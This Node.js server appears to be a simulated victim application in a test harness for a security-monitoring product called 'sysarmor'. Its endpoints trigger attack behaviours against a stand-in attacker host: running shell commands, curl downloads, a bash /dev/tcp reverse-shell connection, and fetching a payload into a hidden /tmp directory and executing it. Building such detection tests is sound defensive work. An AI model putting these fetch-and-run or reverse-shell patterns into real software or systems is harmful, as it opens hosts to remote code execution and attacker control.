"use strict";

const http = require("http");
const fs = require("fs");
const { spawn } = require("child_process");
const { URL } = require("url");

const port = Number(process.env.WEB_PORT || 3000);
const attackHost = process.env.ATTACK_HOST || "sysarmor-release-attacker";
const downloadPort = Number(process.env.DOWNLOAD_PORT || 8080);
const controlPort = Number(process.env.CONTROL_PORT || 8443);
const markerPattern = /^[A-Za-z0-9._-]+$/;

function run(command, args) {
  return new Promise((resolve, reject) => {
    const child = spawn(command, args, { stdio: ["ignore", "ignore", "pipe"] });
    let error = "";
    child.stderr.on("data", (chunk) => { error += chunk; });
    child.on("error", reject);
    child.on("close", (code) => {
      if (code === 0) resolve();
      else reject(new Error(`${command} exited ${code}: ${error.trim()}`));
    });
  });
}

function sendJson(response, status, body) {
  response.writeHead(status, { "content-type": "application/json" });
  response.end(`${JSON.stringify(body)}\n`);
}

function requireMarker(url, response) {
  const marker = url.searchParams.get("marker") || "";
  if (!markerPattern.test(marker)) {
    sendJson(response, 400, { status: "error", error: "invalid marker" });
    return "";
  }
  return marker;
}

async function handleAttack(pathname, marker) {
  if (pathname === "/rce") {
    await run("/bin/sh", ["-c", "printf '%s\\n' \"$1\" >/dev/null", "sysarmor-rce", marker]);
    return;
  }
  if (pathname === "/download") {
    const url = `http://${attackHost}:${downloadPort}/file?marker=${encodeURIComponent(marker)}`;
    await run("/usr/bin/curl", ["-fsS", url, "-o", "/dev/null"]);
    return;
  }
  if (pathname === "/reverse-shell") {
    const command = 'exec 3<>"/dev/tcp/$1/$2"; printf "GET /control?marker=%s HTTP/1.0\\r\\n\\r\\n" "$3" >&3; cat <&3 >/dev/null';
    await run("/bin/bash", ["-c", command, "sysarmor-reverse-shell", attackHost, String(controlPort), marker]);
    return;
  }
  const payloadDir = "/tmp/.sysarmor-attack";
  const payloadPath = `${payloadDir}/${marker}`;
  fs.mkdirSync(payloadDir, { recursive: true, mode: 0o700 });
  const url = `http://${attackHost}:${downloadPort}/payload?marker=${encodeURIComponent(marker)}&control_port=${controlPort}`;
  await run("/usr/bin/curl", ["-fsS", url, "-o", payloadPath]);
  await run("/bin/sh", [payloadPath]);
}

const server = http.createServer(async (request, response) => {
  const url = new URL(request.url, `http://${request.headers.host || "localhost"}`);
  if (url.pathname === "/healthz") {
    sendJson(response, 200, { status: "ok" });
    return;
  }
  if (!["/rce", "/download", "/reverse-shell", "/exec-connect", "/payload"].includes(url.pathname)) {
    sendJson(response, 404, { status: "error", error: "not found" });
    return;
  }
  const marker = requireMarker(url, response);
  if (!marker) return;
  try {
    await handleAttack(url.pathname, marker);
    console.log(JSON.stringify({ event: url.pathname.slice(1), marker }));
    sendJson(response, 200, { status: "ok", marker });
  } catch (error) {
    console.error(error.stack || error.message);
    sendJson(response, 500, { status: "error", error: error.message });
  }
});

server.listen(port, "0.0.0.0", () => {
  console.log(JSON.stringify({ event: "ready", service: "web-app", port }));
});
